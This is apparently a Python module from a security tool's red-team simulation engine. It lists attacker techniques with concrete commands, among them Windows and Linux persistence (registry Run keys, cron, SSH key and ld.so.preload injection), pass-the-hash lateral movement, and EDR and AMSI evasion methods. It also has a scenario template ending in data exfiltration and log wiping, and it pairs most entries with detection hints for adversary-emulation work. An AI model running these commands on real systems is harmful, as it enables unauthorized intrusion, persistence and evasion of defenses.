from __future__ import annotations

import json
import os
import socket
import subprocess
import tempfile
import time
from typing import Any

from skoll_agent.engines.base_engine import BaseEngine, EngineResult


RED_TEAM_PERSISTENCE = [
    {
        "name": "Schtasks",
        "technique": "Scheduled Task",
        "command_windows": 'schtasks /create /tn "Updater" /tr "C:\\payload.exe" /sc daily /st 09:00',
        "detection": "Event ID 4698 (Task registered), Sysmon Event 1",
    },
    {
        "name": "Registry Run",
        "technique": "Registry Run Key",
        "command_windows": 'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d "C:\\payload.exe"',
        "detection": "Sysmon Event 13 (Registry value set), Autoruns",
    },
    {
        "name": "WMI",
        "technique": "WMI Event Subscription",
        "command_windows": 'wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter CREATE Name="Updater", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"',
        "detection": "WMI Persistence via EventConsumer/Filter",
    },
    {
        "name": "Startup Folder",
        "technique": "Startup Folder",
        "command_windows": 'copy C:\\payload.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"',
        "detection": "Sysmon Event 11 (FileCreate), autorunsc",
    },
    {
        "name": "Service",
        "technique": "Windows Service",
        "command_windows": 'sc create Updater binPath= "C:\\payload.exe" start= auto',
        "detection": "Event ID 7045 (Service install), Sysmon Event 11",
    },
    {
        "name": "DLL Hijacking",
        "technique": "DLL Search Order Hijacking",
        "command_windows": "Place malicious DLL in path before legitimate application loads it",
        "detection": "Sysmon Event 7 (Image loaded), Process Monitor",
    },
    {
        "name": "COM Hijacking",
        "technique": "COM Object Hijacking",
        "command_windows": 'reg add HKCU\\Software\\Classes\\CLSID\\{GUID}\\InprocServer32 /ve /t REG_SZ /d "C:\\payload.dll"',
        "detection": "Sysmon Event 13, Procmon CLSID checks",
    },
    {
        "name": "Logon Script",
        "technique": "User Logon Script",
        "command_windows": 'reg add HKCU\\Environment /v UserInitMprLogonScript /t REG_SZ /d "C:\\payload.exe"',
        "detection": "Sysmon Event 13",
    },
    {
        "name": "SSH Key Persistence",
        "technique": "SSH Authorized Keys",
        "command_linux": 'echo "ssh-rsa AAA... kali@redteam" >> ~/.ssh/authorized_keys',
        "detection": "Monitor authorized_keys file changes",
    },
    {
        "name": "Cron",
        "technique": "Cron job",
        "command_linux": '(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/payload") | crontab -',
        "detection": "Monitor /var/spool/cron/crontabs",
    },
    {
        "name": "systemd",
        "technique": "Systemd service",
        "command_linux": "Create /etc/systemd/system/updater.service with ExecStart=/tmp/payload",
        "detection": "Monitor /etc/systemd/system/ changes",
    },
    {
        "name": "LD_PRELOAD",
        "technique": "LD_PRELOAD persistence",
        "command_linux": 'echo "/tmp/malicious.so" >> /etc/ld.so.preload',
        "detection": "Monitor /etc/ld.so.preload",
    },
]

EVASION_TECHNIQUES = [
    {
        "name": "Process Hollowing",
        "technique": "Inject code into a suspended legitimate process",
        "tools": "Metasploit (post/windows/manage/hollow), Cobalt Strike, custom shellcode",
    },
    {
        "name": "API Unhooking",
        "technique": "Restore original API calls from ntdll.dll to avoid EDR hooks",
        "tools": "SharpUnhooker, TikiTorch, Hell's Gate",
    },
    {
        "name": "Syscall Direct",
        "technique": "Bypass userland hooks using direct syscalls (Hell's Gate, Halo's Gate)",
        "tools": "SysWhispers, SysWhispers2, Hell's Gate",
    },
    {
        "name": "Parent PID Spoofing",
        "technique": "Spoof PPID to appear as legitimate process (explorer.exe)",
        "tools": "Metasploit (set PPID), Cobalt Strike (ppid)",
    },
    {
        "name": "AMSI Bypass",
        "technique": "Bypass Windows Antimalware Scan Interface",
        "tools": "amsi.fail, powershell -Command (reflection-based bypass)",
    },
    {
        "name": "ETW Bypass",
        "technique": "Bypass Event Tracing for Windows",
        "tools": "Patch ETW, SharpEtw, .NET reflection",
    },
    {
        "name": "Sandbox Detection",
        "technique": "Detect analysis environments (VM, debugger, sandbox)",
        "tools": "Check MAC, RAM < 2GB, CPU cores, disk size, running processes",
    },
    {
        "name": "Sleep Obfuscation",
        "technique": "Encrypt implant in memory during sleep to avoid scans",
        "tools": "Ekko, Win32 API (WaitForSingleObjectEx), ECat",
    },
    {
        "name": "DLL Sideloading",
        "technique": "Place malicious DLL in path of legitimate signed binary",
        "tools": "Any signed binary that loads DLLs from current directory",
    },
    {
        "name": "Living off the Land (LotL)",
        "technique": "Use built-in OS tools (powershell, wmic, certutil, bitsadmin)",
        "tools": "PowerShell, WMIC, Certutil, BITSAdmin, MSBuild",
    },
]

C2_CONCEPTS = [
    {
        "name": "HTTP/S C2",
        "technique": "C2 over HTTP/HTTPS (most common, easy to setup)",
        "frameworks": "Metasploit, Empire, Sliver, Covenant, Havoc",
    },
    {
        "name": "DNS C2",
        "technique": "Data exfiltration and commands over DNS queries",
        "frameworks": "DNScat2, Cobalt Strike (DNS Beacon), Nodll",
    },
    {
        "name": "ICMP C2",
        "technique": "C2 over ICMP echo packets (ping tunnel)",
        "frameworks": "Icmd, PingTunnel, Ptunnel",
    },
    {
        "name": "Domain Fronting",
        "technique": "Hide C2 behind legitimate CDN (Cloudfront, Azure, Cloudflare)",
        "frameworks": "Cobalt Strike, Custom implementations",
    },
    {
        "name": "WebSocket C2",
        "technique": "C2 over WebSocket connections (bypasses some proxies)",
        "frameworks": "Mythic, Custom implants",
    },
    {
        "name": "SMB C2",
        "technique": "Peer-to-peer C2 over SMB named pipes",
        "frameworks": "Cobalt Strike (SMB Beacon), Sliver",
    },
    {
        "name": "Dropbox/Google Drive C2",
        "technique": "C2 using cloud storage APIs as dead drop",
        "frameworks": "Custom (DropBoxC2, GoogleDriveC2, MegaC2)",
    },
    {
        "name": "Social Media C2",
        "technique": "C2 via Twitter/Discord/Telegram/GitHub posts or comments",
        "frameworks": "TwittC2, DiscordC2, TelegramC2",
    },
]

LATERAL_MOVEMENT_TECHNIQUES = [
    {
        "name": "PsExec",
        "technique": "Execute commands remotely via SVCCTL (admin shares)",
        "command": 'psexec \\\\target -u DOMAIN\\user -p pass cmd',
        "tools": "Impacket (psexec.py), PsExec.exe, Metasploit (psexec)",
    },
    {
        "name": "WMI",
        "technique": "WMI for remote process creation and execution",
        "command": 'wmic /node:target process call create "cmd /c payload"',
        "tools": "Impacket (wmiexec.py), wmic.exe, powershell Invoke-WmiMethod",
    },
    {
        "name": "WinRM",
        "technique": "Windows Remote Management (HTTP/HTTPS)",
        "command": 'winrs -r:target cmd',
        "tools": "Impacket (wmiexec.py), winrs.exe, PowerShell New-PSSession",
    },
    {
        "name": "SMB Exec",
        "technique": "Execute commands via SMB protocol",
        "command": "",
        "tools": "Impacket (smbexec.py), Metasploit (smbexec)",
    },
    {
        "name": "DCOM",
        "technique": "Distributed COM lateral movement",
        "command": "",
        "tools": "Impacket (dcomexec.py), PowerShell, Metasploit",
    },
    {
        "name": "Pass the Hash",
        "technique": "Authenticate using NTLM hash (no password needed)",
        "command": 'psexec -hashes LM:NTLM DOMAIN\\user@target cmd',
        "tools": "Impacket (psexec.py -hashes), CrackMapExec, Metasploit (psexec_psh)",
    },
    {
        "name": "Pass the Ticket",
        "technique": "Authenticate using Kerberos TGT/TGS ticket",
        "command": "Mimikatz: kerberos::ptc ticket.kirbi",
        "tools": "Mimikatz, Rubeus, Impacket",
    },
    {
        "name": "Overpass the Hash",
        "technique": "Convert NTLM hash to Kerberos TGT",
        "command": 'Rubeus asktgt /user:admin /ntlm:HASH /domain:DOMAIN',
        "tools": "Rubeus, Mimikatz, Impacket (getTGT.py)",
    },
    {
        "name": "SSH",
        "technique": "Lateral movement via SSH on Linux/Unix",
        "command": 'ssh user@target "command"',
        "tools": "OpenSSH, plink, paramiko",
    },
    {
        "name": "SCP/RSYNC",
        "technique": "File transfer and execution via SCP/RSYNC",
        "command": 'scp payload user@target:/tmp/ && ssh user@target /tmp/payload',
        "tools": "OpenSSH, rsync",
    },
]


class RedteamEngine(BaseEngine):
    name = "redteam"
    description = "Red Team simulation engine. Emula tacticas, tecnicas y procedimientos de atacantes reales: persistencia, evasion, C2, movimiento lateral."
    capabilities = ["red_team", "simulation", "persistence", "evasion", "c2", "lateral_movement", "adversary_emulation"]

    def scan(self, target: str, **kwargs: Any) -> EngineResult:
        findings = []
        raw_lines: list[str] = []

        mode = kwargs.get("mode", "all")
        technique = kwargs.get("technique", "")

        raw_lines.append(f"[INFO] Red Team simulation mode={mode}")

        if mode in ("persistence", "all"):
            self._simulate_persistence(findings, raw_lines)
        if mode in ("evasion", "all"):
            self._simulate_evasion(findings, raw_lines)
        if mode in ("c2", "all"):
            self._simulate_c2(findings, raw_lines)
        if mode in ("lateral", "all"):
            self._simulate_lateral(findings, raw_lines)
        if mode == "scenario":
            self._build_scenario(target, technique, findings, raw_lines)
        if mode == "check_defenses":
            self._check_defenses(findings, raw_lines)

        summary = f"redteam: {len(findings)} hallazgos/tecnicas ({mode})"
        return EngineResult(
            success=bool(findings),
            raw_output="\n".join(raw_lines),
            findings=findings,
            summary=summary,
        )

    def _simulate_persistence(self, findings: list[dict[str, Any]],
                              raw_lines: list[str]) -> None:
        raw_lines.append(f"[INFO] Persistence techniques: {len(RED_TEAM_PERSISTENCE)}")

        for p in RED_TEAM_PERSISTENCE:
            cmd = p.get("command_windows") or p.get("command_linux", "")
            findings.append({
                "file_path": "", "line_start": 0, "line_end": 0,
                "severity": "high",
                "title": f"Persistence: {p['name']} ({p['technique']})",
                "description": f"Tecnica de persistencia: {p['technique']}\nComando: {cmd}\nDeteccion: {p['detection']}",
                "tool": self.name, "rule_id": f"redteam-persist-{p['name'].lower().replace(' ','-')}",
                "technique_name": p["name"], "technique": p["technique"],
                "command": cmd, "detection": p["detection"],
            })
            raw_lines.append(f"  {p['name']}: {p['technique']}")

    def _simulate_evasion(self, findings: list[dict[str, Any]],
                          raw_lines: list[str]) -> None:
        raw_lines.append(f"[INFO] Evasion techniques: {len(EVASION_TECHNIQUES)}")

        for e in EVASION_TECHNIQUES:
            findings.append({
                "file_path": "", "line_start": 0, "line_end": 0,
                "severity": "info",
                "title": f"Evasion: {e['name']}",
                "description": f"Tecnica de evasion: {e['technique']}\nHerramientas: {e['tools']}",
                "tool": self.name, "rule_id": f"redteam-evasion-{e['name'].lower().replace(' ','-')}",
                "technique_name": e["name"], "technique": e["technique"], "tools": e["tools"],
            })
            raw_lines.append(f"  {e['name']}: {e['technique']}")

    def _simulate_c2(self, findings: list[dict[str, Any]],
                     raw_lines: list[str]) -> None:
        raw_lines.append(f"[INFO] C2 concepts: {len(C2_CONCEPTS)}")

        for c in C2_CONCEPTS:
            findings.append({
                "file_path": "", "line_start": 0, "line_end": 0,
                "severity": "info",
                "title": f"C2 concept: {c['name']}",
                "description": f"Tecnica C2: {c['technique']}\nFrameworks: {c['frameworks']}",
                "tool": self.name, "rule_id": f"redteam-c2-{c['name'].lower().replace(' ','-').replace('/','-')}",
                "technique_name": c["name"], "technique": c["technique"], "frameworks": c["frameworks"],
            })
            raw_lines.append(f"  {c['name']}: {c['technique']}")

    def _simulate_lateral(self, findings: list[dict[str, Any]],
                          raw_lines: list[str]) -> None:
        raw_lines.append(f"[INFO] Lateral movement techniques: {len(LATERAL_MOVEMENT_TECHNIQUES)}")

        for l in LATERAL_MOVEMENT_TECHNIQUES:
            findings.append({
                "file_path": "", "line_start": 0, "line_end": 0,
                "severity": "high",
                "title": f"Lateral movement: {l['name']}",
                "description": f"Tecnica: {l['technique']}\nComando: {l['command']}\nHerramientas: {l['tools']}",
                "tool": self.name, "rule_id": f"redteam-lateral-{l['name'].lower().replace(' ','-')}",
                "technique_name": l["name"], "technique": l["technique"],
                "command": l["command"], "tools": l["tools"],
            })
            raw_lines.append(f"  {l['name']}: {l['technique']}")

    def _build_scenario(self, target: str, technique: str,
                        findings: list[dict[str, Any]],
                        raw_lines: list[str]) -> None:
        raw_lines.append(f"[INFO] Construyendo escenario Red Team para {target}")

        scenario = f"""=== RED TEAM SCENARIO: {target} ===

Fase 1: Reconocimiento
  - Escaneo de puertos con nmap/masscan
  - Enumeracion de servicios con whatweb/gobuster
  - Identificacion de endpoints API

Fase 2: Acceso Inicial
  - Identificar vulnerabilidades web (SQLi, XSS, LFI)
  - Fuerza bruta de credenciales con hydra
  - Phishing de ser necesario

Fase 3: Establecer Persistencia
  - Instalar listener C2 ({technique or 'HTTP'})
  - Ejecutar stager en el target
  - Configurar persistencia via {technique or 'schtasks/registry'}

Fase 4: Evasion de Defensas
  - Bypass de AMSI/ETW en Windows
  - Evitar triggers de EDR
  - Usar LotL tools

Fase 5: Movimiento Lateral
  - Dumpear credenciales con Mimikatz/Impacket
  - Pass the Hash para moverte a otros sistemas
  - Escalar privilegios via exploits

Fase 6: Exfiltracion
  - Comprimir y exfiltrar datos sensibles
  - Limpiar logs y evidencia

Contecnica de evasion"""
        raw_lines.append(scenario)

        findings.append({
            "file_path": target, "line_start": 0, "line_end": 0,
            "severity": "high",
            "title": f"Red Team scenario: {target}",
            "description": scenario[:500],
            "tool": self.name, "rule_id": "redteam-scenario",
            "scenario_target": target,
        })

    def _check_defenses(self, findings: list[dict[str, Any]],
                        raw_lines: list[str]) -> None:
        raw_lines.append("[INFO] Verificando defensas del sistema...")

        checks = [
            ("Windows Defender", "powershell", 'Get-MpPreference', "Windows Defender"),
            ("Firewall", "iptables", "-L", "Linux iptables"),
            ("AppArmor", "aa-status", "", "AppArmor status"),
            ("SELinux", "getenforce", "", "SELinux mode"),
            ("Sysmon", "powershell", "Get-Service Sysmon", "Sysmon service"),
            ("EDR", "powershell", "Get-CimInstance -Namespace root/securitycenter -Class AntivirusProduct", "AV product"),
        ]

        for name, cmd_type, cmd_arg, desc in checks:
            try:
                if cmd_type == "powershell" and subprocess.run(["which", "pwsh"], capture_output=True).returncode == 0:
                    r = subprocess.run(["pwsh", "-Command", cmd_arg], capture_output=True, text=True, timeout=10)
                    if r.stdout.strip():
                        raw_lines.append(f"[INFO] {name}: {r.stdout.strip()[:100]}")
                elif cmd_type != "powershell":
                    r = subprocess.run([cmd_type, *cmd_arg.split()], capture_output=True, text=True, timeout=10)
                    if r.returncode == 0:
                        raw_lines.append(f"[INFO] {name}: ejecutable")
            except Exception:
                pass

    def _check_cli(self, tool: str) -> bool:
        try:
            subprocess.run([tool, "--version"], capture_output=True, timeout=5)
            return True
        except Exception:
            return False

    def parse_output(self, raw_output: str) -> list[dict[str, Any]]:
        return []
